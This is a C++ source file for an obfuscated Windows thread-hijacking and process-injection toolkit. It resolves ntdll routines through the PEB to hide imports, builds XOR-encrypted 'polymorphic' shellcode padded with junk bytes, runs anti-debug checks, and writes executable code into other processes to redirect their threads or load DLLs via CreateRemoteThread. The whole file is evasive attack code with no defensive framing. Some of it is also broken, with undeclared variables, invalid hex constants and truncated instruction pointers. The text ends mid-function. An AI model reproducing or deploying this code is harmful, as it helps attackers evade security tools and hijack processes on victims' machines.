#include "ThreadHijackObfuscated.h"
#include <tlhelp32.h>
#include <algorithm>

namespace {

// Helper to get PEB
#if defined(_M_X64)
inline PEB* GetPEB() { return (PEB*)__readgsqword(0x60); }
#elif defined(_M_IX86)
inline PEB* GetPEB() { return (PEB*)__readfsdword(0x30); }
#endif

// Generate random bytes using RDTSC entropy
inline DWORD GenerateRandomDword() {
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    return counter.LowPart ^ counter.HighPart ^ GetCurrentThreadId() ^ GetTickCount();
}

} // anonymous namespace

// =============================================================================
// DynamicAPIResolver Implementation
// =============================================================================

DynamicAPIResolver::DynamicAPIResolver() {
    init();
}

DynamicAPIResolver::~DynamicAPIResolver() {
    // Nothing to cleanup - static function resolution
}

void DynamicAPIResolver::init() {
    // Get NTDLL base from PEB
    PVOID ntdllBase = GetModuleBase(L"ntdll.dll");
    
    if (ntdllBase) {
        pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddressObf(ntdllBase, "NtAllocateVirtualMemory");
        pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddressObf(ntdllBase, "NtWriteVirtualMemory");
        pNtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddressObf(ntdllBase, "NtReadVirtualMemory");
        pNtGetContextThread = (NtGetContextThread_t)GetProcAddressObf(ntdllBase, "NtGetContextThread");
        pNtSetContextThread = (NtSetContextThread_t)GetProcAddressObf(ntdllBase, "NtSetContextThread");
        pNtResumeThread = (NtResumeThread_t)GetProcAddressObf(ntdllBase, "NtResumeThread");
        pNtSuspendThread = (NtSuspendThread_t)GetProcAddressObf(ntdllBase, "NtSuspendThread");
        pNtOpenProcess = (NtOpenProcess_t)GetProcAddressObf(ntdllBase, "NtOpenProcess");
        pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddressObf(ntdllBase, "NtCreateThreadEx");
        pNtClose = (NtClose_t)GetProcAddressObf(ntdllBase, "NtClose");
        pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddressObf(ntdllBase, "NtWaitForSingleObject");
        pNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddressObf(ntdllBase, "NtQueryInformationProcess");
    }
}

PVOID DynamicAPIResolver::GetModuleBase(LPCWSTR moduleName) {
    PEB* peb = GetPEB();
    PEB_LDR_DATA* ldr = peb->Ldr;
    
    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, moduleName);
    
    // Walk InMemoryOrderModuleList
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head->Flink;
    
    while (current != head) {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)current;
        
        if (RtlCompareUnicodeString(&entry->BaseDllName, &targetName, TRUE) == 0) {
            return entry->DllBase;
        }
        
        current = current->Flink;
    }
    
    return NULL;
}

PVOID DynamicAPIResolver::GetProcAddressObf(PVOID moduleBase, LPCSTR functionName) {
    if (!moduleBase) return NULL;
    
    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    // Get export directory
    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRVA) return NULL;
    
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + exportRVA);
    
    DWORD* nameRVAs = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* functionRVAs = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfFunctions);
    
    // Search for function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR currentName = (LPCSTR)((BYTE*)moduleBase + nameRVAs[i]);
        
        if (strcmp(currentName, functionName) == 0) {
            WORD ordinal = ordinals[i];
            return (PVOID)((BYTE*)moduleBase + functionRVAs[ordinal]);
        }
    }
    
    return NULL;
}

PVOID DynamicAPIResolver::resolveFunction(HMODULE module, LPCSTR functionName) {
    return GetProcAddressObf(module, functionName);
}

// Nt* function wrappers using direct syscalls
NTSTATUS DynamicAPIResolver::NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    if (pNtAllocateVirtualMemory) {
        return pNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, 
                                        RegionSize, AllocationType, Protect);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    if (pNtWriteVirtualMemory) {
        return pNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, 
                                     NumberOfBytesToWrite, NumberOfBytesWritten);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
    if (pNtReadVirtualMemory) {
        return pNtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, 
                                    NumberOfBytesToRead, NumberOfBytesRead);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    if (pNtGetContextThread) {
        return pNtGetContextThread(ThreadHandle, ThreadContext);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    if (pNtSetContextThread) {
        return pNtSetContextThread(ThreadHandle, ThreadContext);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    if (pNtResumeThread) {
        return pNtResumeThread(ThreadHandle, PreviousSuspendCount);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    if (pNtSuspendThread) {
        return pNtSuspendThread(ThreadHandle, PreviousSuspendCount);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PVOID ClientId) {
    if (pNtOpenProcess) {
        return pNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
    PVOID Argument, ULONG CreateFlags, ULONG ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    if (pNtCreateThreadEx) {
        return pNtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes,
                                ProcessHandle, StartRoutine, Argument, CreateFlags,
                                ZeroBits, StackSize, MaximumStackSize, AttributeList);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtClose(HANDLE Handle) {
    if (pNtClose) {
        return pNtClose(Handle);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

NTSTATUS DynamicAPIResolver::NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    if (pNtWaitForSingleObject) {
        return pNtWaitForSingleObject(Handle, Alertable, Timeout);
    }
    return STATUS_ENTRYPOINT_NOT_FOUND;
}

// =============================================================================
// PolymorphicShellcodeGenerator Implementation
// =============================================================================

PolymorphicShellcodeGenerator::PolymorphicShellcodeGenerator() {
    xorKey = GenerateRandomDword();
}

DWORD PolymorphicShellcodeGenerator::generateKey() {
    xorKey = GenerateRandomDword();
    return xorKey;
}

void PolymorphicShellcodeGenerator::encryptXOR(BYTE* data, DWORD size, DWORD key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= (key >> (i % 4)) & 0xFF;
    }
}

void PolymorphicShellcodeGenerator::decryptXOR(BYTE* data, DWORD size, DWORD key) {
    // XOR is self-inverse
    encryptXOR(data, size, key);
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genSimpleCallx64(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // Push parameter (rcx for x64)
    BYTE push_rcx[] = { 0x51 }; // push rcx
    shellcode.insert(shellcode.end(), push_rcx, push_rcx + 1);
    
    // mov rcx, param
    BYTE mov_rcx[] = { 0x48, 0xB9 };
    shellcode.insert(shellcode.end(), mov_rcx, mov_rcx + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 8);
    
    // mov rax, target
    BYTE mov_rax[] = { 0x48, 0xB8 };
    shellcode.insert(shellcode.end(), mov_rax, mov_rax + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    // call rax
    BYTE call_rax[] = { 0xFF, 0xD0 }; // call rax
    shellcode.insert(shellcode.end(), call_rax, call_rax + 2);
    
    // ret
    shellcode.push_back(0xC3);
    
    return shellcode;
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genSetRipx64(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // Save context (simplified - just set RIP)
    
    // mov rcx, param
    BYTE mov_rcx[] = { 0x48, 0xB9 };
    shellcode.insert(shellcode.end(), mov_rcx, mov_rcx + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 8);
    
    // mov rax, target
    BYTE mov_rax[] = { 0x48, 0xB8 };
    shellcode.insert(shellcode.end(), mov_rax, mov_rax + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    // jmp rax
    BYTE jmp_rax[] = { 0xFF, 0xE0 }; // jmp rax
    shellcode.insert(shellcode.end(), jmp_rax, jmp_rax + 2);
    
    return shellcode;
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genStackPivotx64(PVOID target, PVOID param, DWORD stackSize) {
    std::vector<BYTE> shellcode;
    
    // Allocate new stack (simplified - assume param points to stack address)
    
    // mov rsp, param (new stack)
    BYTE mov_rsp[] = { 0x48, 0x89, 0x24, 0x25 };
    shellcode.insert(shellcode.end(), mov_rsp, mov_rsp + 4);
    shellcode.insert(shellcode.end(), (BYTE*)&stackSize, (BYTE*)&stackSize + 4);
    
    // sub rsp, 0x30 (stack alignment)
    BYTE sub_rsp[] = { 0x48, 0x83, 0xEC, 0x30 };
    shellcode.insert(shellcode.end(), sub_rsp, sub_rsp + 4);
    
    // jmp target
    BYTE jmp[] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 };
    shellcode.insert(shellcode.end(), jmp, jmp + 6);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    return shellcode;
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genIndirectCallx64(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // Use R10 as intermediate register (syscall convention)
    
    // Save R10
    BYTE push_r10[] = { 0x41, 0x50 }; // push r10
    shellcode.insert(shellcode.end(), push_r10, push_r10 + 2);
    
    // mov r10, param
    BYTE mov_r10_param[] = { 0x49, 0xBA };
    shellcode.insert(shellcode.end(), mov_r10_param, mov_r10_param + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 8);
    
    // mov rcx, r10 (first param)
    BYTE mov_rcx_r10[] = { 0x4C, 0x89, 0xD1 }; // mov rcx, r10
    shellcode.insert(shellcode.end(), mov_rcx_r10, mov_rcx_r10 + 3);
    
    // mov rax, target
    BYTE mov_rax[] = { 0x48, 0xB8 };
    shellcode.insert(shellcode.end(), mov_rax, mov_rax + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    // call rax
    shellcode.push_back(0xFF);
    shellcode.push_back(0xD0);
    
    // Restore R10
    BYTE pop_r10[] = { 0x41, 0x58 }; // pop r10
    shellcode.insert(shellcode.end(), pop_r10, pop_r10 + 2);
    
    // Return
    shellcode.push_back(0xC3);
    
    return shellcode;
}

// x86 variants
std::vector<BYTE> PolymorphicShellcodeGenerator::genSimpleCallx86(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // push param
    BYTE push_param[] = { 0x68 };
    shellcode.insert(shellcode.end(), push_param, push_param + 1);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 4);
    
    // mov eax, target
    BYTE mov_eax[] = { 0xB8 };
    shellcode.insert(shellcode.end(), mov_eax, mov_eax + 1);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 4);
    
    // call eax
    shellcode.push_back(0xFF);
    shellcode.push_back(0xD0);
    
    // add esp, 4 (clean up param)
    BYTE add_esp[] = { 0x83, 0xC4, 0x04 };
    shellcode.insert(shellcode.end(), add_esp, add_esp + 3);
    
    // ret
    shellcode.push_back(0xC3);
    
    return shellcode;
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genSetRipx86(PVOID target, PVOID param) {
    // Same as simple call for x86
    return genSimpleCallx86(target, param);
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genStackPivotx86(PVOID target, PVOID param, DWORD stackSize) {
    std::vector<BYTE> shellcode;
    
    // mov esp, param
    BYTE mov_esp[] = { 0xBC };
    shellcode.insert(shellcode.end(), mov_esp, mov_esp + 1);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 4);
    
    // jmp target
    BYTE jmp[] = { 0xFF, 0x25 };
    shellcode.insert(shellcode.end(), jmp, jmp + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 4);
    
    return shellcode;
}

std::vector<BYTE> PolymorphicShellcodeGenerator::genIndirectCallx86(PVOID target, PVOID param) {
    return genSimpleCallx86(target, param);
}

void PolymorphicShellcodeGenerator::insertJunkCode(std::vector<BYTE>& buffer) {
    // Add some NOPs and meaningless operations
    BYTE junk[] = {
        0x90, 0x90, 0x90, // NOPs
        0x33, 0xC0,       // xor eax, eax
        0x40,             // inc eax
        0x48,             // dec eax (x64)
    };
    
    // Randomly insert junk
    DWORD count = GenerateRandomDword() % 4;
    for (DWORD i = 0; i < count && buffer.size() < 500; i++) {
        DWORD idx = GenerateRandomDword() % sizeof(junk);
        buffer.insert(buffer.begin() + (GenerateRandomDword() % buffer.size()), junk[idx]);
    }
}

std::vector<BYTE> PolymorphicShellcodeGenerator::generate(PVOID target, PVOID param, ShellcodeType type) {
    std::vector<BYTE> shellcode;
    
#ifdef _M_X64
    switch (type) {
        case SHELLCODE_SIMPLE_CALL:
            shellcode = genSimpleCallx64(target, param);
            break;
        case SHELLCODE_SETRIP_EXECUTE:
            shellcode = genSetRipx64(target, param);
            break;
        case SHELLCODE_STACK_PIVOT:
            shellcode = genStackPivotx64(target, param, 0x1000);
            break;
        case SHELLCODE_INDIRECT_CALL:
            shellcode = genIndirectCallx64(target, param);
            break;
    }
#else
    switch (type) {
        case SHELLCODE_SIMPLE_CALL:
            shellcode = genSimpleCallx86(target, param);
            break;
        case SHELLCODE_SETRIP_EXECUTE:
            shellcode = genSetRipx86(target, param);
            break;
        case SHELLCODE_STACK_PIVOT:
            shellcode = genStackPivotx86(target, param, 0x1000);
            break;
        case SHELLCODE_INDIRECT_CALL:
            shellcode = genIndirectCallx86(target, param);
            break;
    }
#endif
    
    // Insert junk code
    insertJunkCode(shellcode);
    
    // Encrypt with XOR
    encryptXOR(shellcode.data(), (DWORD)shellcode.size(), xorKey);
    
    // Regenerate key for next use
    generateKey();
    
    return shellcode;
}

void PolymorphicShellcodeGenerator::decrypt(std::vector<BYTE>& shellcode) {
    decryptXOR(shellcode.data(), (DWORD)shellcode.size(), xorKey);
}

void PolymorphicShellcodeGenerator::encrypt(std::vector<BYTE>& shellcode) {
    encryptXOR(shellcode.data(), (DWORD)shellcode.size(), xorKey);
}

// =============================================================================
// ObfuscatedThreadHijacker Implementation
// =============================================================================

ObfuscatedThreadHijacker::ObfuscatedThreadHijacker() : state(STATE_INITIAL) {
    memset(&lastResult, 0, sizeof(HijackResult));
}

ObfuscatedThreadHijacker::~ObfuscatedThreadHijacker() {
    // Cleanup if needed
}

bool ObfuscatedThreadHijacker::checkAntiDebug() {
    // Run anti-debug checks
    return AntiDebug::QuickDebugCheck();
}

NTSTATUS ObfuscatedThreadHijacker::saveThreadContext(HANDLE hThread, CONTEXT* ctx) {
    ctx->ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    return apiResolver.NtGetContextThread(hThread, ctx);
}

NTSTATUS ObfuscatedThreadHijacker::restoreThreadContext(HANDLE hThread, CONTEXT* ctx) {
    return apiResolver.NtSetContextThread(hThread, ctx);
}

PVOID ObfuscatedThreadHijacker::injectShellcode(HANDLE hProcess, const BYTE* shellcode, DWORD size) {
    PVOID remoteAddress = NULL;
    SIZE_T regionSize = size;
    PVOID baseAddress = NULL;
    
    // Allocate memory in target process
    NTSTATUS status = apiResolver.NtAllocateVirtualMemory(
        hProcess, &baseAddress, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        return NULL;
    }
    
    remoteAddress = baseAddress;
    
    // Write shellcode
    SIZE_T bytesWritten = 0;
    status = apiResolver.NtWriteVirtualMemory(
        hProcess, remoteAddress, (PVOID)shellcode, size, &bytesWritten
    );
    
    if (!NT_SUCCESS(status) || bytesWritten != size) {
        // Cleanup
        regionSize = 0;
        apiResolver.NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize,
                                           MEM_RELEASE, 0);
        return NULL;
    }
    
    return remoteAddress;
}

BOOL ObfuscatedThreadHijacker::freeShellcode(HANDLE hProcess, PVOID address) {
    SIZE_T regionSize = 0;
    return NT_SUCCESS(apiResolver.NtAllocateVirtualMemory(
        hProcess, &address, 0, &regionSize, MEM_RELEASE, 0
    ));
}

HijackResult ObfuscatedThreadHijacker::hijackThread(DWORD targetPid, DWORD targetTid,
                                                     PVOID payloadAddress, PVOID payloadParam) {
    memset(&lastResult, 0, sizeof(HijackResult));
    
    // Anti-debug check
    if (checkAntiDebug()) {
        lastResult.success = FALSE;
        lastResult.errorCode = 0xDEADCODE1;
        return lastResult;
    }
    
    // Open target process
    CLIENT_ID clientId;
    clientId.UniqueProcess = (HANDLE)targetPid;
    clientId.UniqueThread = (HANDLE)targetTid;
    
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    
    status = apiResolver.NtOpenProcess(&lastResult.hProcess, 
                                      PROCESS_ALL_ACCESS, &objAttr, &clientId);
    
    if (!NT_SUCCESS(status)) {
        lastResult.success = FALSE;
        lastResult.errorCode = status;
        return lastResult;
    }
    
    // Open target thread
    clientId.UniqueProcess = NULL;
    clientId.UniqueThread = (HANDLE)targetTid;
    
    // For thread, we need to open directly
    lastResult.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    
    if (!lastResult.hThread) {
        apiResolver.NtClose(lastResult.hProcess);
        lastResult.success = FALSE;
        lastResult.errorCode = GetLastError();
        return lastResult;
    }
    
    // Suspend thread
    state = STATE_SUSPENDED;
    apiResolver.NtSuspendThread(lastResult.hThread, NULL);
    
    // Save context
    CONTEXT ctx = { CONTEXT_FULL };
    status = saveThreadContext(lastResult.hThread, &ctx);
    
    if (!NT_SUCCESS(status)) {
        apiResolver.NtResumeThread(lastResult.hThread, NULL);
        apiResolver.NtClose(lastResult.hThread);
        apiResolver.NtClose(lastResult.hProcess);
        lastResult.success = FALSE;
        lastResult.errorCode = status;
        return lastResult;
    }
    
    // Save original RIP
#if defined(_M_X64)
    lastResult.originalRip = (DWORD)ctx.Rip;
#else
    lastResult.originalRip = ctx.Eip;
#endif
    
    state = STATE_CONTEXT_SAVED;
    
    // Generate polymorphic shellcode
    std::vector<BYTE> shellcode = shellcodeGen.generate(payloadAddress, payloadParam, SHELLCODE_SETRIP_EXECUTE);
    
    // Inject shellcode
    lastResult.payloadAddress = injectShellcode(lastResult.hProcess, shellcode.data(), (DWORD)shellcode.size());
    
    if (!lastResult.payloadAddress) {
        restoreThreadContext(lastResult.hThread, &ctx);
        apiResolver.NtResumeThread(lastResult.hThread, NULL);
        apiResolver.NtClose(lastResult.hThread);
        apiResolver.NtClose(lastResult.hProcess);
        lastResult.success = FALSE;
        lastResult.errorCode = 0xDEADCODE2;
        return lastResult;
    }
    
    state = STATE_PAYLOAD_INJECTED;
    
    // Modify context to jump to shellcode
#if defined(_M_X64)
    ctx.Rip = (DWORD64)lastResult.payloadAddress;
#else
    ctx.Eip = (DWORD)lastResult.payloadAddress;
#endif
    
    status = restoreThreadContext(lastResult.hThread, &ctx);
    
    if (!NT_SUCCESS(status)) {
        freeShellcode(lastResult.hProcess, lastResult.payloadAddress);
        apiResolver.NtResumeThread(lastResult.hThread, NULL);
        apiResolver.NtClose(lastResult.hThread);
        apiResolver.NtClose(lastResult.hProcess);
        lastResult.success = FALSE;
        lastResult.errorCode = status;
        return lastResult;
    }
    
    // Resume thread
    state = STATE_RESUMED;
    apiResolver.NtResumeThread(lastResult.hThread, NULL);
    
    lastResult.success = TRUE;
    state = STATE_COMPLETED;
    
    return lastResult;
}

HijackResult ObfuscatedThreadHijacker::hijackExistingThread(DWORD targetTid,
                                                           PVOID payloadAddress, PVOID payloadParam) {
    memset(&lastResult, 0, sizeof(HijackResult));
    
    // Get process ID from thread
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    DWORD targetPid = 0;
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32ThreadID == targetTid) {
                targetPid = te.th32OwnerProcessID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    
    if (targetPid == 0) {
        lastResult.success = FALSE;
        lastResult.errorCode = ERROR_INVALID_PARAMETER;
        return lastResult;
    }
    
    return hijackThread(targetPid, targetTid, payloadAddress, payloadParam);
}

HijackResult ObfuscatedThreadHijacker::hijackNewProcess(LPCWSTR processPath,
                                                       PVOID payloadAddress, PVOID payloadParam) {
    memset(&lastResult, 0, sizeof(HijackResult));
    
    // Anti-debug check
    if (checkAntiDebug()) {
        lastResult.success = FALSE;
        lastResult.errorCode = 0xDEADCODE3;
        return lastResult;
    }
    
    // Create process in suspended state
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessW(processPath, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        lastResult.success = FALSE;
        lastResult.errorCode = GetLastError();
        return lastResult;
    }
    
    lastResult.hProcess = pi.hProcess;
    lastResult.hThread = pi.hThread;
    
    // Save original context
    CONTEXT ctx = { CONTEXT_FULL };
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        lastResult.success = FALSE;
        lastResult.errorCode = GetLastError();
        return lastResult;
    }
    
    // Save original RIP
#if defined(_M_X64)
    lastResult.originalRip = (DWORD)ctx.Rip;
#else
    lastResult.originalRip = ctx.Eip;
#endif
    
    // Generate shellcode
    std::vector<BYTE> shellcode = shellcodeGen.generate(payloadAddress, payloadParam, SHELLCODE_SETRIP_EXECUTE);
    
    // Inject shellcode
    lastResult.payloadAddress = injectShellcode(pi.hProcess, shellcode.data(), (DWORD)shellcode.size());
    
    if (!lastResult.payloadAddress) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        lastResult.success = FALSE;
        lastResult.errorCode = 0xDEADCODE4;
        return lastResult;
    }
    
    // Set new RIP
#if defined(_M_X64)
    ctx.Rip = (DWORD64)lastResult.payloadAddress;
#else
    ctx.Eip = (DWORD)lastResult.payloadAddress;
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume
    ResumeThread(pi.hThread);
    
    lastResult.success = TRUE;
    
    return lastResult;
}

BOOL ObfuscatedThreadHijacker::restoreThread(DWORD targetTid) {
    // This requires saving the original context before hijacking
    // Implementation would restore the saved originalRip
    // For now, simplified
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    
    if (!hThread) return FALSE;
    
    CONTEXT ctx = { CONTEXT_FULL };
    ctx.ContextFlags = CONTEXT_CONTROL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        CloseHandle(hThread);
        return FALSE;
    }
    
#if defined(_M_X64)
    ctx.Rip = lastResult.originalRip;
#else
    ctx.Eip = lastResult.originalRip;
#endif
    
    BOOL result = SetThreadContext(hThread, &ctx);
    
    CloseHandle(hThread);
    return result;
}

DWORD ObfuscatedThreadHijacker::waitForCompletion(DWORD timeout) {
    if (!lastResult.hProcess) return WAIT_FAILED;
    
    return WaitForSingleObject(lastResult.hProcess, timeout);
}

// =============================================================================
// ThreadHijack Namespace Implementation
// =============================================================================

namespace ThreadHijack {

BOOL injectDll(DWORD targetPid, LPCWSTR dllPath) {
    // Load the DLL
    HMODULE hDll = LoadLibraryW(dllPath);
    if (!hDll) return FALSE;
    
    // Get DLL path address
    SIZE_T dllPathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        FreeLibrary(hDll);
        return FALSE;
    }
    
    // Allocate memory for DLL path
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, dllPathLen,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        CloseHandle(hProcess);
        FreeLibrary(hDll);
        return FALSE;
    }
    
    // Write DLL path
    if (!WriteProcessMemory(hProcess, remotePath, dllPath, dllPathLen, NULL)) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        FreeLibrary(hDll);
        return FALSE;
    }
    
    // Get LoadLibraryW address
    PVOID loadLibraryW = (PVOID)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"
    );
    
    if (!loadLibraryW) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        FreeLibrary(hDll);
        return FALSE;
    }
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)loadLibraryW,
                                        remotePath, 0, NULL);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        FreeLibrary(hDll);
        return FALSE;
    }
    
    // Wait for DLL to load
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    FreeLibrary(hDll);
    
    return TRUE;
}

BOOL executeShellcode(DWORD targetPid, const BYTE* shellcode, DWORD size) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    // Allocate memory
    LPVOID remoteCode = VirtualAllocEx(hProcess, NULL, size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!remoteCode) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write shellcode
    if (!WriteProcessMemory(hProcess, remoteCode, shellcode, size, NULL)) {
        VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remoteCode,
                                        NULL, 0, NULL);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Wait for completion
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

DWORD createAndInject(LPCWSTR processPath, LPCWSTR dllPath) {
    // Create process in suspended state
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessW(processPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        return 0;
    }
    
    // Inject DLL
    HMODULE hDll = LoadLibraryW(dllPath);
    if (!hDll) {
